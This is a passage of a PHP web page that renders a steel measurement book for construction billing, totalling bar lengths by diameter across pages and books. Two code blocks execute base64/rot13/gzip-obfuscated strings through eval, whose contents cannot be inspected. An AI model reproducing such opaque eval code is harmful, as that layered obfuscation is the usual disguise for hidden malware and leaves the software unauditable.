				$mbookno = $MBList->mbno; //echo "1 = ".$abstmbno."<br/>";
				$mpage = $MBList->startpage;
			}else{
				$SelectMB 		= $MBList->mbno; 
				$SelectMBPage 	= $MBList->startpage;
				if($SelectMBPage != ''){
					array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
					array_push($NextMBPageList,$SelectMBPage);
				}
			}
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>Steel M.Book</title>
        <link rel="stylesheet" href="script/font.css" />
        
    </head>
		<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
		<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
		<link rel="stylesheet" href="css/button_style.css"></link>
	 	<link rel="stylesheet" href="js/jquery-ui.css">
	  	<script src="js/jquery-1.10.2.js"></script>
	  	<script src="js/jquery-ui.js"></script>
	  	<link rel="stylesheet" href="/resources/demos/style.css">
		<script src="js/printPage.js"></script>
		<link rel="stylesheet" href="dist/sweetalert.css">
		<script src="dist/sweetalert-dev.js"></script><!--<script>
  <!--<script>
  $(function() {
   $("#dialog").dialog({ autoOpen: false,
        minHeight: 200,
        maxHeight:200,
        minWidth: 300,
        maxWidth: 300,
        modal: true,});
        $("#dialog").dialog("open");
		//$("body").css({ overflow: 'hidden' });
        $( "#dialog" ).dialog( "option", "draggable", false );
       	 $('#btn_cancel').click(function(){
		 $("#dialog").dialog("close");
		 window.location.href="Generate.php";
		 });
        $('#btn').click(function(){
		var x = $('#newmbooklist option:selected').val();
			if(x == "")
			{
				var a="* Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
			}
			else
			{
				$("#dialog").dialog("close"); 
				//$("body").css({ overflow: 'scroll' });      
				var newmbookvalue = $("#newmbooklist option:selected").text(); //alert(newmbookvalue);
				var oldmbookdetails = document.form.txt_steelmbno_id.value;
				$.post("GetOldMbookNo.php", {oldmbook: oldmbookdetails}, function (data) {
				window.location.href="SteelMbook.php?newmbook="+newmbookvalue;
				return false; // avoid to execute the actual submit of the form.
				});
			 }
         });
				$.fn.validatenewmbook = function(event) 
				{ 
					if($('#newmbooklist option:selected').val()=="")
					{ 
						var a="Please select Next Mbook number";
						$('#error_msg').text(a);
						event.preventDefault();
						event.returnValue = false;
						//return false;
					}
					else
					{
						var a="";
						$('#error_msg').text(a);
					}
				}
				$("#newmbooklist").change(function(event){
				   $(this).validatenewmbook(event);
				 });		 
		 
		 
  });
  </script>-->
<style type="text/css" media="print,screen" >
	table
	{ 
		border-collapse: collapse; 
	}
	td 
	{ 
		border: 1px solid #A0A0A0; 
	}
	@media screen 
	{
        div.divFooter 
		{
            display: none;
        }
    }
    @media print 
	{
        div.divFooter 
		{
            position: fixed;
            bottom: 0;
			size: landscape;
        } 
		.header
		{
			display: none !important;
		}
		.printbutton
		{
			display: none !important;
		}
	}
	.ui-dialog > .ui-widget-header 
	{
		background: #20b2aa; 
		font-size:12px;
	}
	.labelcontent
	{
		font-family:Microsoft New Tai Lue;
		font-size:12pt;
		color:#000000;
	}
	.ui-dialog-titlebar-close 
	{
	  visibility: hidden;
	}
	.submit_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:80px;
		font-weight:bold;
		font-size:12px;
	}
	.cancel_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:160px;
		font-weight:bold;
		font-size:12px;
	}
	.submit_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.cancel_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.headingfont
	{
	 /*color:#FFFFFF;*/
	}
	.label, .labelcenter, .labelheadblue
	{
		font-size:13px;
	}
</style>
<!--<script type="text/javascript">
                            //var value = prompt("Enter MBook value", "");
var variable='';                           
   $(function(){
        $("#test").dialog({ autoOpen: false,
        minHeight: 200,
        maxHeight:200,
        minWidth: 300,
        maxWidth: 300,
        modal: true,});
        $("#test").dialog("open");
        $( "#test" ).dialog( "option", "draggable", false );
       
        $('#btn').click(function(){
        $("#test").dialog("close");       
        var newmbookvalue = $("#newmbooklist option:selected").text();      
        document.getElementById("newmbook").value =newmbookvalue;
         $.post("GetNewMbookNo.php", {currentmbook: newmbookvalue}, function (data) {
           //window.history.replaceState(null, null, "MBook.php");
           pageurl ="MBook.php";
             //window.history.back();
          location.reload();
           // window.history.back();

    return false; // avoid to execute the actual submit of the form.
          
         });
         });
});
  </script> -->
  <SCRIPT type="text/javascript">
		window.history.forward();
		function noBack() { window.history.forward(); }
	</SCRIPT>
    <body id="top" bgcolor="" oncontextmenu="return false"onload="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="">
<!--<table width="1087px" style="position:fixed; text-align:center; left:88px;" height="60px" align="center" bgcolor="#20b2aa" class='header'>
<tr>
<td style="color:#FFFFFF; border:none; font-weight:bold; font-size:20px;">STEEL MEASUREMENT BOOK</td>
</tr>
</table><br/><br/><br/>-->
        <form name="form" method="post" style="">
		<input type="hidden" name="hid_staffid" id="hid_staffid" value="<?php echo $staffid; ?>" />
		<input type="hidden" name="hid_sheetid" id="hid_sheetid" value="<?php echo $sheetid; ?>" />
		<input type="hidden" name="hid_userid" id="hid_userid" value="<?php echo $userid; ?>" />
		<input type="hidden" name="txt_steelmbno_id" value="<?php echo $steelmbno_id."*".$mbookno."*"."S"."*".$staffid."*".$sheetid; ?>" id="txt_steelmbno_id" />
			<?php
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ?>
            <?php echo $table2; $tablehead = $table;?>

            <table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor='#FFFFFF' class="label">
			<?php echo $table1; ?>
                <?php 
                eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

			   $sqlmeasurequery = mysql_query($measurequery);    
               if($sqlmeasurequery == true)
               {
                while ($List = mysql_fetch_object($sqlmeasurequery)) 
                { //echo $mpage;
				if($List->shortnotes == ""){ $List->shortnotes = $List->description; }
				$decimal = get_decimal_placed($List->subdivid,$sheetid);
				$sub_type = $List->sub_type;
				//$meas_no = $List->measurement_no;
				$meas_no1 = $List->measurement_no;
				$meas_no2 = $List->measurement_no2;
				if(($meas_no2 != "") && ($meas_no2 != 0))
				{
					$meas_no = $meas_no1*$meas_no2;
				}
				else
				{
					$meas_no = $meas_no1;
				}
				$_SESSION['last_row_check'] = 0;
					if($mpage > 100)
					{
						/*if($_GET['varid'] == 1)
						{
							
							
							?>
							<div id="dialog" title="Choose MBook No." style=" background-color:#f9f8f6;font-size: 12px;">
							<p style="font-size:12px; font-weight:bold; color:#911200;">Select Next MBook Number</p>
							<select id="newmbooklist" name="mb" style="width:275px;">
							<option value="">---------------------Select--------------------</option>
							<?php echo $objBind->BindMBookList($mbookno,$sheetid,$staffid,$mbooktype); ?>
							</select>
							<br/>
							<span id="error_msg" style="color:#FF0000; font-weight:bold;"></span>
							<input type="button" class="submit_btn" id="btn" style="color:#FFFFFF;background-color:#9c27b0;border:none;" name="btn" value="Submit"/>
							<input type="button" class="cancel_btn" id="btn_cancel" style="color:#FFFFFF;background-color:#e51c23;border:none;" name="btn_cancel" value="Cancel"/>
							</div>
							<?php
						}*/
						/*$currentline = $start_line + 13;
						$prevpage = 100;
						$mpage = $newmbookpageno;
						//$prevpage = $mpage;
						$mbookno = $newmbookno;*/
					}
					
					
					if(($mpage != $prevpage) && ($prevdate == $List->date) && ($prevsubdivid == $List->subdivid))
					{
						$tmb2 = $sumst;
                     $explodedval = explode("@",$tmb2); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
                        }
                     }
					 if($tot8 != "" || $tot10 != "" || $tot12 != "" || $tot16 != "" || $tot20 != "" || $tot25 != "" || $tot28 != "" || $tot32 != "" || $tot36!= "")
					 {
					?>
						
					<tr height=''>
                    <td width='' colspan="7" class='labelbold' style='text-align:right'><?php echo "B/f from Page ".$prevpage."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'><?php //echo $mpage; ?></td>-->
                	</tr>
				<?php 
					 $currentline++;
					 }
				//echo $currentline;
				//$currentline++;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				}
				
                    $measurementdia=$List->measurement_dia;
                    //$NOS=chop($List->measurement_no);
                    //$LOM=chop($List->measurement_l);
                    //$totaldia=trim($NOS*$LOM);
                    $NOS=chop($List->measurement_no);
					$NOS2=chop($List->measurement_no2);
                    $LOM=chop($List->measurement_l);
					if(($NOS2 != "") && ($NOS2 != 0))
					{
                    	$totaldia=round(($NOS*$LOM*$NOS2),$decimal);
					}
					else
					{
                    	$totaldia=round(($NOS*$LOM),$decimal);
					}
                    
                    if($prevsubdiv_name != $List->subdiv_name)
                    {
                        if($prevsubdiv_name != "")
                        {
                            $temp = 1;
                        } 
                        if($prevsubdiv_name == "")
                        {
                        ?>
                            <tr height=''>
                                <td width='' class='labelcenter'><?php echo $List->date; ?></td>
                                <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                                <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                            </tr>
                  <?php 
				  		//$length1 = strlen($List->shortnotes);
						//$linecnt1 = ceil($length1/145);
						
						$wrap_cnt1 = 0;
